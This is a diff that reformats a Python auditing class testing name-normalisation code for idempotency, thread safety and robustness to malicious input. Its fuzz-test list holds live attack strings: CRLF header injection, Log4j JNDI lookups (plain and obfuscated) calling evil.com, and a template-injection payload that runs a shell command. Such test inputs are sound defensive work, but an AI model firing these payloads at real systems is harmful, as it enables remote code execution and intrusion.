@@ -78,7 +78,10 @@ class UltraManiacAuditor:
                 region = self.manager.get_region(code)
                 if region:
                     # Test basic operations
-                    test_entry = {"GlobalID": f"test-{code}", "CanonicalLatin": "Test Name"}
+                    test_entry = {
+                        "GlobalID": f"test-{code}",
+                        "CanonicalLatin": "Test Name",
+                    }
                     region.clean(test_entry)
                     region.augment(test_entry)
                     region.validate(test_entry)
@@ -106,7 +109,12 @@ class UltraManiacAuditor:
             # Complex mixed cases
             ("A2", {"CanonicalLatin": "François-Xavier de Montmorency-Laval"}),
             ("E1", {"CanonicalNative": "王小明", "CanonicalLatin": "Wang Xiaoming"}),
-            ("G1", {"CanonicalLatin": "José María de la Cruz García-Rodríguez y Fernández"}),
+            (
+                "G1",
+                {
+                    "CanonicalLatin": "José María de la Cruz García-Rodríguez y Fernández"
+                },
+            ),
             # Edge cases with special characters
             ("A1", {"CanonicalLatin": "Test--1"}),  # Collision suffix
             ("B2", {"CanonicalLatin": "Test\tWith\tTabs"}),  # Tabs
@@ -152,7 +160,9 @@ class UltraManiacAuditor:
                 if j1 == j2 == j3:
                     idempotent += 1
                 else:
-                    name = entry_data.get("CanonicalNative") or entry_data.get("CanonicalLatin")
+                    name = entry_data.get("CanonicalNative") or entry_data.get(
+                        "CanonicalLatin"
+                    )
                     self.issues.append(f"Idempotency fail (3x): {region_code}: {name}")
 
             except Exception as e:
@@ -177,7 +187,10 @@ class UltraManiacAuditor:
             ("%0d%0aSet-Cookie: admin=true", "CRLF"),
             ("${jndi:ldap://evil.com/a}", "Log4j"),
             # More sophisticated attacks
-            ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "Template RCE"),
+            (
+                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+                "Template RCE",
+            ),
             (
                 "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
                 "Obfuscated Log4j",
@@ -276,7 +289,9 @@ class UltraManiacAuditor:
 
         expected = 20 * 100  # 20 threads * 100 iterations
         if shared_data["counter"] != expected:
-            self.issues.append(f"Race condition: expected {expected}, got {shared_data['counter']}")
+            self.issues.append(
+                f"Race condition: expected {expected}, got {shared_data['counter']}"
+            )
             return False
 
         return True
@@ -403,7 +418,9 @@ class UltraManiacAuditor:
                 region.clean(entry2)
                 region.augment(entry2)
 
-                if json.dumps(entry1, sort_keys=True) == json.dumps(entry2, sort_keys=True):
+                if json.dumps(entry1, sort_keys=True) == json.dumps(
+                    entry2, sort_keys=True
+                ):
                     idempotent += 1
                 else:
                     self.issues.append(f"Not idempotent: {code}")
